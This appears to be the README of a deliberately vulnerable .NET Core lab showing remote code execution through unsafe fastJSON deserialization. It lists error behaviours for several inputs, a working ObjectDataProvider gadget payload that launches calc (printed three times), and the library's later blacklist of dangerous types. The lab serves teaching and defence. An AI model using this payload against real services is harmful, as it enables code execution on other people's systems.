# Infallible McCarthy

## Vulnerability

.NET Core project where a JSON deserialization vulnerability leads to RCE, due to unsafe deserialization in the fastJSON library.

## Usage

Submit JSON values on the [Privacy Policy](http://localhost:8080/Privacy) page.

### Behaviour 1

Submitting the form with no input leads to a `System.NullReferenceException`

### Behaviour 2

Submitting the form with a JSON string like `"sdf"` will return a `System.InvalidCastException` because fastJSON cannot convert the input to a type of `app.Pages.ExpectedType`

### Behaviour 3

Submitting the form with an empty JSON object like `{}` will return a `System.Exception: Cannot determine type` exception because the JSON doesn't include type hints for fastJSON to deserialize.

### Behaviour 4

Submitting JSON that matches the expected type `app.Pages.ExpectedType` will serialize successfully.

```
{"$type": "app.Pages.ExpectedType, app"}
```

### Behaviour 5

Trying to run the exploit on a .NET Core application in a Linux operating environment may fail due to the gadgets not being available.  

The `PresentationFramework` for example is not available on Linux for example so this exploit will likely only work on Windows targets:

```
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["calc"]
    },
    "MethodName": "Start"
}
```

You will receive an error like `System.Exception: Cannot determine type : System.Windows.Data.ObjectDataProvider, PresentationFramework` if you try to run this.

### Exploit 1


Older versions (pre 2.3.0)

```
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["calc"]
    },
    "MethodName": "Start"
}
```

### Fix 1

Recent versions (v2.3.0+) of the library implement a blacklist for known RCE types that will return the error `System.Exception: Black list type encountered, possible attack vector when using $type : System.Windows.Data.ObjectDataProvider, PresentationFramework`

* _"I have added JSONParameters.BadListTypeChecking which defaults to true to check for known $type attack vectors from the paper published from HP Enterprise Security Group, when enabled it will throw an exception and stop processing the json." — [mgholam](https://github.com/mgholam/fastJSON)_
* [Issue #108](https://github.com/mgholam/fastJSON/issues/108)
* [Blacklist](https://github.com/mgholam/fastJSON/blob/master/fastJSON/Reflection.cs#L107)
  ```
  private static List<string> _badlistTypes = new List<string>()
        {
            "system.configuration.install.assemblyinstaller",
            "system.activities.presentation.workflowdesigner",
            "system.windows.resourcedictionary",
            "system.windows.data.objectdataprovider",
            "system.windows.forms.bindingsource",
            "microsoft.exchange.management.systemmanager.winforms.exchangesettingsprovider"
        };
  ```
* [HP Enterprise: Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)


```
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["calc"]
    },
    "MethodName": "Start"
}
```